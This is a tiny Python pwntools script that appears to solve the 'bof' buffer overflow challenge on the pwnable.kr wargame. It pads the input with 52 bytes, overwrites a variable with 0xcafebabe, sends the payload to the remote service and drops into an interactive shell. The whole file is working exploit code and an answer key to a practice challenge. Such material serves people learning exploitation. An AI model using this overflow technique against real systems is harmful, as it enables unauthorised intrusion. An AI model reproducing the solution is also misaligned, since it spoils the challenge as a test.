from pwn import *


payload = 'A' * 52 + '\xbe\xba\xfe\xca'
p = remote('pwnable.kr',9000)
# overflow me:
p.send(payload)
p.interactive()